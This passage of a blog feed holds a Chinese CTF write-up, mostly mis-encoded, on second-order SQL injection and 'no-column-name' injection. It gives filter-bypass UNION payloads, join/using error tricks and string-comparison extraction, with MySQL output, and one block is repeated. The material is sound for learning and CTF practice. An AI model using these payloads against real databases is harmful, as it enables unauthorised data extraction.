id="ä»€ä¹ˆæ˜¯äºŒæ¬¡æ³¨å…¥"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯äºŒæ¬¡æ³¨å…¥">#</a> ä»€ä¹ˆæ˜¯äºŒæ¬¡æ³¨å…¥ï¼š</h4><p>â€‹äºŒæ¬¡æ³¨å…¥å°±æ˜¯æŒ‡ä»¥å‚¨å­˜ï¼ˆæ•°æ®åº“ã€æ–‡ä»¶ï¼‰çš„ç”¨æˆ·è¾“å…¥è¢«è¯»å–åå†æ¬¡è¿›å…¥åˆ° SQL æŸ¥è¯¢è¯­å¥ä¸­å¯¼è‡´æ³¨å…¥ã€‚</p><h4 id="äºŒæ¬¡æ³¨å…¥çš„åŸç†"><a class="markdownIt-Anchor" href="#äºŒæ¬¡æ³¨å…¥çš„åŸç†">#</a> äºŒæ¬¡æ³¨å…¥çš„åŸç†ï¼š</h4><p>â€‹é¦–å…ˆï¼Œå¯¹äºæŸäº›å­—ç¬¦ï¼Œåœ¨è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„æŸäº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œæ¯”å¦‚ 1â€™å˜æˆäº† 1\â€™ åœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™ä¿ç•™äº†åŸæ¥çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ 1â€™ã€‚ç„¶åï¼Œå¼€å‘è€…åˆé»˜è®¤äº†å­˜å…¥æ•°æ®åº“ä¸­çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œå› æ­¤ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºè€Œå·²æ ‘æ®ï¼Œå¹¶æ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ï¼Œåœ¨ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ä¸­æ‹¼å‡‘åœ¨ä¸€èµ·ï¼Œå°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚</p><h4 id="ç»§ç»­åšé¢˜"><a class="markdownIt-Anchor" href="#ç»§ç»­åšé¢˜">#</a> ç»§ç»­åšé¢˜ï¼š</h4><p>â€‹æ—¢ç„¶è¿™é“é¢˜æ˜¯ä¸ªäºŒæ¬¡æ³¨å…¥çš„é¢˜ç›®ï¼Œé‚£ä¹ˆå°±åº”è¯¥è€ƒè™‘ï¼Œä½¿ç”¨ sql æ³¨å…¥çš„æ–¹å¼äº†ã€‚é¦–å…ˆæ„é€ è¯­å¥ï¼Œåˆ¤æ–­æ³¨å…¥ç±»å‹ä»¥åŠæƒ³åŠæ³•æ¸…æ¥šåˆ°åº•è¿‡æ»¤äº†é‚£äº›å…³é”®å­—ï¼Œé¦–å…ˆæ„é€  sql è¯­å¥ï¼Œä¹‹åç”³è¯·ï¼Œç„¶åå¹¿å‘Šè¯¦æƒ…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;</span><br></pre></td></tr></table></figure><p>â€‹å¾—åˆ°äº†</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near â€˜â€˜1â€™â€™ limit 0,1â€™ at line 1</p></blockquote><p>â€‹çš„ä¸€ä¸ªå›æ˜¾ï¼Œé€šè¿‡æŠ¥é”™ä¿¡æ¯ï¼Œæˆ–è®¸æ˜¯ä¸€ä¸ªå­—ç¬¦å‹æ³¨å…¥ï¼Œç´§æ¥ç€ï¼Œåˆ¤æ–­è¿‡æ»¤ï¼Œç»è¿‡å¤šæ¬¡å°è¯•ï¼Œå‘ç°è¿‡æ»¤äº†çš„æœ‰ï¼š</p><blockquote><p>or , # , ç©ºæ ¼ï¼Œorder by ï¼Œinformation_schema</p></blockquote><p>â€‹å¯¹äºç©ºæ ¼è€Œè¨€ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ /**/ æ¥ç»•è¿‡ï¼Œorder by åˆ™å¯ä»¥ä½¿ç”¨ group by ï¼Œ# åˆ™å¯ä»¥ä½¿ç”¨ï¼Œ'3 æ¥é—­åˆåé¢çš„å¼•å·æ¥ç»•è¿‡ï¼Œå¦å¤–ï¼Œinformation_schema åˆ™å¯ä»¥ä½¿ç”¨æœ€å¼€å§‹è¯´åˆ°çš„æ— åˆ—åæ³¨å…¥çš„ç›¸å…³çš„çŸ¥è¯†äº†ï¼Œé€šè¿‡<strong> InnoDb</strong> å¼•æ“æŸ¥è¡¨åï¼Œç¬¬ä¸€ä¸ª payload ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/group/**/by/**/22,&#x27;3</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆï¼Œæ„é€ çš„ group by åé¢çš„æ•´æ•°ä½ 22 çš„æ—¶å€™ï¼Œæ²¡æœ‰å‡ºç°é”™è¯¯ï¼Œä½†æ˜¯ï¼Œå½“æ•´æ•°ä¸º 23 çš„æ—¶å€™ï¼Œå´å‡ºç°äº†æŠ¥é”™ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/3ef317d47b864de49209ed80d92d26fb.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¤§è‡´å¯ä»¥æ¨æµ‹å‡ºï¼Œå­—æ®µæ€»çš„æœ‰ 22 ä¸ªã€‚</p><p>â€‹é‚£ä¹ˆï¼ŒçŸ¥é“äº†æ€»çš„æœ‰å¤šå°‘ä¸ªå­—æ®µä¹‹åï¼Œå°±å¯ä»¥è¯•ç€è·å¾—æ•°æ®åº“åå’Œè¡¨åäº†ï¼Œæ„é€ çš„ payload åˆ†åˆ«ä¸ºï¼š</p><p>â€‹é¦–å…ˆé€šè¿‡æ„é€ å¦‚ä¸‹ payload è·å–å›æ˜¾ç‚¹ï¼Œæœ€åå‘ç°ï¼Œå›æ˜¾ç‚¹æ˜¯ 2ï¼Œ3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure><p>â€‹è·å¾—æ•°æ®åº“åï¼ŒæˆåŠŸæ‹¿åˆ°æ•°æ®åº“ä¸º web1ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27; </span><br></pre></td></tr></table></figure><p>â€‹è·å¾—è¡¨åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span><br></pre></td></tr></table></figure><p>â€‹æœ€åç¡®å®šï¼Œweb1 è¿™ä¸ªæ•°æ®åº“ä¸­å­˜åœ¨çš„è¡¨ä¸ºå¦‚ä¸‹ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/854b8d1498074d73a2f7023c6ab6f41f.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æ ¹æ® dalao ä»¬çš„ wpï¼Œä»–ä»¬ä½¿ç”¨çš„éƒ½æ˜¯ users è¿™ä¸ªè¡¨ï¼Œå› æ­¤ï¼Œè¿™é‡Œå°±ä¸ç”¨ä¸€ä¸ªè¡¨ä¸€ä¸ªè¡¨åœ°æŸ¥äº†ï¼Œç›´æ¥ users è¿™ä¸ªè¡¨æ¢­å“ˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span><br></pre></td></tr></table></figure><p>â€‹è¯¥ payload æ˜¯åˆ©ç”¨äº†ä¸Šé¢è¯´åˆ°çš„æ— åˆ—ååœ° union æ–¹æ³•è¿›è¡Œçš„ï¼Œå½“ç„¶ï¼Œä¸ºå•¥ç¡®å®š users è¡¨ä¸­å­˜åœ¨ 3 ä¸ªå­—æ®µå‘¢ï¼Ÿå› ä¸ºç»è¿‡è¯•é”™ï¼Œå‘ç°ä¸€ä¸ªå­—æ®µï¼Œä¸¤ä¸ªå­—æ®µä»¥åŠå››ä¸ªä»¥ä¸Šçš„æ—¶å€™ï¼Œå‡æ˜¯æŠ¥é”™ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè¿›è¡ŒæŸ¥è¯¢ï¼Œç„¶åé€šè¿‡</p><p>â€‹ç„¶åé€šè¿‡ä¿®æ”¹ as b æ‰€åœ¨çš„åœ°æ–¹ï¼Œæ¯”å¦‚ 1 çš„åæ–¹æˆ–è€… 2 çš„åæ–¹å¯¹åˆ—è¿›è¡ŒæŸ¥æ‰¾ï¼Œæœ€åå‘ç°åœ¨ç¬¬ä¸‰åˆ—æŸ¥åˆ°äº† flagï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/169fb5b613c84ef7bea030410db6f7dc.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å®Œæˆå•¦  <strong>(pâ‰§wâ‰¦q)</strong>  ã€‚</p><h2 id="æ— åˆ—åæ³¨å…¥join"><a class="markdownIt-Anchor" href="#æ— åˆ—åæ³¨å…¥join">#</a> æ— åˆ—åæ³¨å…¥â€“joinï¼š</h2><p>â€‹å½“ç„¶ï¼Œç”±äº union åœ¨çš„åœ°ä½å¤ªè¿‡é‡è¦ï¼Œå› æ­¤æœ‰çš„æ—¶å€™å¯èƒ½ä¼šç›´æ¥å¯¹ union è¿›è¡Œè¿‡æ»¤ï¼Œè¿™ä¸ªæ—¶å€™å‘¢ï¼Œå°±éœ€è¦ç”¨åˆ° join æ¥è¿›è¡Œæ³¨å…¥ã€‚</p><blockquote><p><strong>åœ¨é‚£ä¹‹å‰ï¼Œå…ˆè®²ä¸€ä¸‹ç›¸å…³çš„å‰ç½®çŸ¥è¯†ï¼Œè™½ç„¶æˆ‘ä¹Ÿä¸æ‡‚è¿™äº›ï¼Œä¸è¿‡è¿˜æ˜¯å…ˆè®°å½•ä¸€ä¸‹ï¼š</strong></p><ul><li>join è¿æ¥ä¸¤å¼ è¡¨</li><li>using () ç”¨äºä¸¤å¼ è¡¨ä¹‹é—´çš„ join è¿æ¥æŸ¥è¯¢ï¼Œå¹¶ä¸” using () ä¸­çš„åˆ—åœ¨ä¸¤å¼ è¡¨ä¸­éƒ½å­˜åœ¨ï¼Œä½œä¸º join çš„æ¡ä»¶</li></ul></blockquote><p>â€‹é¦–å…ˆï¼Œè¿˜æ˜¯ä¹‹å‰çš„é‚£ä¸€ä¸ª ctfer çš„æ•°æ®åº“ï¼Œä¸‹é¢é€šè¿‡è¿™ä¸ªæ•°æ®åº“åšå‡ ä¸ªå®éªŒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users as a join users as b;</span><br><span class="line">+----------+-----------+-----------------------------------+----------+-----------+-----------------------------------+</span><br><span class="line">| username | password  | flag                              | username | password  | flag                              |</span><br><span class="line">+----------+-----------+-----------------------------------+----------+-----------+-----------------------------------+</span><br><span class="line">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; | xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+----------+-----------+-----------------------------------+----------+-----------+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹<strong>å¯ä»¥å‘ç°ï¼ŒæŸ¥è¯¢çš„ä¸¤æ¬¡åŒä¸€ä¸ªè¡¨ï¼Œè¢«æ‹¼æ¥æˆäº†ä¸€ä¸ª</strong>ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿè¯•è¯•åœ¨è¿™ä¹‹å‰åŠ ä¸Šä¸€ä¸ªæŸ¥è¯¢ï¼Œçœ‹çœ‹æŸ¥è¯¢è¿™æ‹¼æ¥åˆ°ä¸€èµ·çš„è¿™ä¸ªè¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from users as a join users as b)a;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‘ç°ï¼ŒæŠ¥é”™äº†ï¼Œå¹¶ä¸”è¿˜æ˜¯å­—æ®µåé‡å¤çš„é”™è¯¯ï¼Œ<strong>æ³¨ï¼šæ‹¬å·å¤–é¢å¿…é¡»å¾—åŠ ä¸Šä»»æ„å­—æ¯ï¼Œå¦åˆ™ä¼šæŠ¥ ERROR 1248 (42000): Every derived table must have its own alias çš„é”™è¯¯</strong>ï¼Œå› æ­¤ï¼Œåˆ™å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼è·å¾—æ‰€æœ‰çš„åˆ—åï¼Œä¸è¿‡å‰æè¿˜æ˜¯å¾—ç”¨<strong> InnoDb å¼•æ“</strong>æ¥è·å–æ•°æ®åº“åä»¥åŠè¡¨åã€‚</p><p>â€‹æ ¹æ®ä¸Šé¢çš„é‚£ä¸ªå¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œå…¶ä¸­ä¸€ä¸ªå­—æ®µçš„åå­—ï¼Œä½†æ˜¯ï¼Œflag æˆ–è®¸å¹¶ä¸åœ¨è¿™ä¸ªå­—æ®µé‡Œï¼Œé‚£ä¹ˆï¼Œå°±éœ€è¦æƒ³ç‚¹åŠæ³•è·å¾—ä¸‹ä¸€ä¸ªå­—æ®µçš„åå­—äº†ï¼Œä¸è¿‡ï¼Œåœ¨é‚£ä¹‹å‰ï¼Œå¾—å…ˆæ’é™¤æ‰å·²ç»çŸ¥é“çš„å­—æ®µåçš„å¹²æ‰°ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users as a join users as b using(username);</span><br><span class="line">+----------+-----------+-----------------------------------+-----------+-----------------------------------+</span><br><span class="line">| username | password  | flag                              | password  | flag                              |</span><br><span class="line">+----------+-----------+-----------------------------------+-----------+-----------------------------------+</span><br><span class="line">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+----------+-----------+-----------------------------------+-----------+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹çœ‹çœ‹ä¸Šé¢çš„å†…å®¹ï¼Œå‘ç°åœ¨å¢åŠ äº†ä¸€ä¸ª **using (username)** ä¹‹åï¼Œusername è¿™ä¸ªå­—æ®µä¼¼ä¹å¥‡è¿¹èˆ¬åœ°æ²¡äº†ï¼Œ<strong>ä¸è¿‡è¿™é‡Œæˆ‘ä¸æ˜¯å¾ˆæ¸…æ¥šåŸç†æ˜¯ä»€ä¹ˆï¼Œä¸è¿‡ï¼Œæš‚æ—¶èƒ½ç”¨å°±è¡Œï¼Œè®°å½•ä¸€ä¸‹ï¼Œä»¥åæœ‰æœºä¼šå­¦åˆ°äº†è¿™é‡Œå†è¿›è¡Œè¡¥å……</strong>ã€‚é‚£ä¹ˆï¼Œåˆ°äº†è¿™ä¸ªæ—¶å€™ï¼Œé‡å¤çš„å­—æ®µå°±åªæœ‰ password å’Œ flag äº†ï¼Œäºæ˜¯ï¼Œå†ç”¨å¦‚ä¸‹çš„è¯­å¥è¿›è¡ŒæŸ¥è¯¢çœ‹çœ‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from users as a join users as b using(username))a;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;password&#x27;</span><br></pre></td></tr></table></figure><p>â€‹æˆåŠŸæŸ¥è¯¢åˆ°äº† password è¿™ä¸ªå­—æ®µåï¼Œç´§æ¥ç€ï¼Œå°† password åŠ å…¥ using () å‡½æ•°ä¸­ï¼Œå¦‚ä¸‹ï¼Œå³å¯æ‹¿åˆ° flag å­—æ®µçš„å­—æ®µåï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from users as a join users as b using(username,password))a;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;flag&#x27;</span><br></pre></td></tr></table></figure><p>â€‹æœ€åä¸€æ­¥ï¼Œå¦‚æœå°† flag å†å¡«è¿› using () å‡½æ•°ä¸­å‘¢ï¼Ÿä¼šå‡ºç°å¦‚ä¸‹æƒ…å†µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from users as a join users as b using(username,password,flag))a;</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">| username | password  | flag                              |</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹å†…å®¹è¢«æˆåŠŸæŸ¥è¯¢å‡ºæ¥äº†ï¼Œä¹‹åå†æ€ä¹ˆåŠå°±å¾—æ ¹æ®é¢˜ç›®çš„å®é™…æƒ…å†µå†³å®šäº†ï¼ŒæˆåŠŸäº†ï¼ï¼ï¼  <strong>(pâ‰§wâ‰¦q)</strong></p><h2 id="æ— åˆ—åæ³¨å…¥asciiä½åç§»"><a class="markdownIt-Anchor" href="#æ— åˆ—åæ³¨å…¥asciiä½åç§»">#</a> æ— åˆ—åæ³¨å…¥â€“ascii ä½åç§»ï¼š</h2><p>â€‹è¿™ä¸ªæ–¹æ³•ï¼Œæ˜¯æœ‰ç‚¹ç±»ä¼¼äº sql ç›²æ³¨çš„çˆ†ç ´çš„ï¼Œåˆ©ç”¨çš„æ˜¯å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ˜¯æŒ‰ä½ç½®è¿›è¡Œæ¯”è¾ƒï¼Œä»æœ€å¼€å§‹çš„é‚£ä¸ªå¼€å§‹ï¼Œä¸€ä½ä¸€ä½åœ°æ¯”è¾ƒï¼Œå› æ­¤ï¼Œå½“å¾—åˆ°æ•°æ®åº“åä»¥åŠè¡¨åä¹‹åï¼Œåˆ™å¯ä»¥è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><p>â€‹ä¸è¿‡è¿™ç§æ–¹æ³•æœ‰ä¸ªå‰æï¼Œå°±æ˜¯éœ€è¦è¡¨å†…åªæœ‰ä¸€ä¸ªå­—æ®µï¼Œä¸ç„¶åªèƒ½è·å–åˆ°ç¬¬ä¸€ä¸ªå­—æ®µçš„å­—æ®µåã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users;</span><br><span class="line">+----------+</span><br><span class="line">| username |</span><br><span class="line">+----------+</span><br><span class="line">| xiaomi   |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆå¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œusername ä¸­çš„å†…å®¹æ˜¯ xiaomiï¼Œå› æ­¤ï¼Œç”¨å¦‚ä¸‹æ–¹å¼å¯ä»¥è¿›è¡Œæ¯”å¯¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select &#x27;x&#x27;)&gt;(select username from users);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| (select &#x27;x&#x27;)&gt;(select username from users) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">|                                         0 |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select &#x27;y&#x27;)&gt;(select username from users);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| (select &#x27;y&#x27;)&gt;(select username from users) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">|                                         1 |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹<strong>å› ä¸ºæˆ‘è¿™é‡Œå­˜åœ¨ä¸‰ä¸ªå­—æ®µï¼Œæ‰€ä»¥è¿™é‡Œåªæœ‰æŒ‡å®šä¸€ä¸‹æŸä¸ªè¡¨è¿›è¡ŒæŸ¥è¯¢</strong>ã€‚æ˜¾è€Œæ˜“è§ï¼Œåœ¨ç¬¬ä¸€è¡Œä¸­ï¼Œæˆ‘ä»¬ç”¨ x è¿›è¡Œå¯¹æ¯”ï¼Œè¿”å›ç»“æœä¸º 0ï¼Œå¯¹æ¯” y çš„æ—¶å€™è¿”å›ç»“æœä¸º 1ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªå­—æ®µçš„å†…å®¹çš„ç¬¬ä¸€ä½ä¸º xï¼Œæ¥ä¸‹æ¥è¿›è¡Œåç»­çš„å¯¹æ¯”ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select &#x27;xi&#x27;)&gt;(select username from users);</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| (select &#x27;xi&#x27;)&gt;(select username from users) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|                                          0 |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select &#x27;xj&#x27;)&gt;(select username from users);</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| (select &#x27;xj&#x27;)&gt;(select username from users) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|                                          1 |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹åç»­çš„æŸ¥è¯¢æ“ä½œä¹Ÿå°±å¾ˆæ˜æ˜¾äº†ï¼Œå½“ç„¶ï¼Œè¿™é‡Œå¦‚æœåˆé€‚çš„è¯å…¶å®å¯ä»¥åˆ©ç”¨ python å†™ä¸ªçˆ¬è™«æ¥è¿›è¡ŒæŸ¥è¯¢çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select &#x27;xiaomia&#x27;)&gt;(select username from users);</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| (select &#x27;xiaomia&#x27;)&gt;(select username from users) |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">|                                               1 |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹å½“ç„¶ï¼Œå¦‚æœæŸ¥è¯¢åˆ°æœ€åä¸€ä¸ªï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯ xiaomi çš„ç¬¬äºŒä¸ª i çš„ä¹‹åï¼Œå¦‚æœå†å¯¹åé¢è¿›è¡Œå¯¹æ¯”çš„æ—¶å€™æ— è®ºå¦‚ä½•ä¹Ÿæ˜¯ 1ï¼Œ<strong>è¿™é‡Œæˆ‘åšä¸€ä¸ªçŒœæµ‹ï¼Œåº”è¯¥æ˜¯å› ä¸ºå­—ç¬¦ä¸²çš„ç»“å°¾æ˜¯ä»¥ \x00 ç»“å°¾ï¼Œå› æ­¤ï¼Œæ¯ä¸€ä¸ªå¯æ˜¾ç¤ºå­—ç¬¦éƒ½è¦æ¯”è¿™ä¸ªå­—ç¬¦å¤§ã€‚</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ect &#x27;xiaomia&#x27;)&gt;(select username from users);</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| (select &#x27;xiaomia&#x27;)&gt;(select username from users) |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">|                                               1 |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹å½“ç„¶ï¼Œå¦‚æœæŸ¥è¯¢åˆ°æœ€åä¸€ä¸ªï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯ xiaomi çš„ç¬¬äºŒä¸ª i çš„ä¹‹åï¼Œå¦‚æœå†å¯¹åé¢è¿›è¡Œå¯¹æ¯”çš„æ—¶å€™æ— è®ºå¦‚ä½•ä¹Ÿæ˜¯ 1ï¼Œ<strong>è¿™é‡Œæˆ‘åšä¸€ä¸ªçŒœæµ‹ï¼Œåº”è¯¥æ˜¯å› ä¸ºå­—ç¬¦ä¸²çš„ç»“å°¾æ˜¯ä»¥ \x00 ç»“å°¾ï¼Œå› æ­¤ï¼Œæ¯ä¸€ä¸ªå¯æ˜¾ç¤ºå­—ç¬¦éƒ½è¦æ¯”è¿™ä¸ªå­—ç¬¦å¤§ã€‚</strong></p><p>â€‹å¥½äº†ï¼Œascii ä½åç§»çš„æ— åˆ—åæ³¨å…¥ä¹Ÿè¯´å®Œäº†ï¼ï¼ï¼ <strong>(pâ‰§wâ‰¦q)</strong></p>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ4ï¼‰ret2libc</title>
      <link href="/posts/52965aaa.html"/>
      <url>/posts/52965aaa.html</url>
      
